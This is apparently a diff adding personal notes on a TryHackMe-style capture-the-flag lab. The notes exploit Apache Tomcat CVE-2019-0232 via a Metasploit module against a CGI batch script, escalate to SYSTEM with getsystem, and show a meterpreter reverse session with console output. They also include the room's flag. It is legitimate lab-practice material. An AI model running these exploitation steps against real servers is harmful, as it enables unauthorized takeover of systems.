@@ -1,0 +1,60 @@
+IP : 10.10.130.37
+
+Open Ports : 3389, 5357, 8009, 8080
+
+Web server on 8080:
+
+Found Vulnerability :  CVE-2019-0232
+It also has metasploit module, lets fire up msfconsole and check this out.
+
+Metasploit module : windows/http/tomcat_cgi_cmdlineargs
+Traget URI for cgi script : /cgi-bin/elfwhacker.bat
+
+Flag : thm{whacking_all_the_elves}
+
+Run local exploit suggester : post/multi/recon/local_exploit_sugester : suggested exploit doesnot run
+
+msf6 exploit(windows/http/tomcat_cgi_cmdlineargs) > use post/windows/escalate/getsystem 
+msf6 post(windows/escalate/getsystem) > options
+
+Module options (post/windows/escalate/getsystem):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   SESSION                     yes       The session to run this module on.
+   TECHNIQUE  0                no        Specify a particular technique to use (1-4), otherwise try them all
+
+msf6 post(windows/escalate/getsystem) > set SESSION 1
+SESSION => 1
+msf6 post(windows/escalate/getsystem) > run
+
+[+] Obtained SYSTEM via technique 4
+[*] Post module execution completed
+
+msf6 post(windows/escalate/getsystem) > sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                        Connection
+  --  ----  ----                     -----------                        ----------
+  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ TBFC-WEB-01  10.9.241.177:4444 -> 10.10.225.153:49727 (10.10.225.153)
+
+msf6 post(windows/escalate/getsystem) > sessions 1
+[*] Starting interaction with 1...
+
+meterpreter > sysinfo
+Computer        : TBFC-WEB-01
+OS              : Windows 2016+ (10.0 Build 17763).
+Architecture    : x64
+System Language : en_GB
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x64/windows
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > 
+
+We are root.
+
+!!!
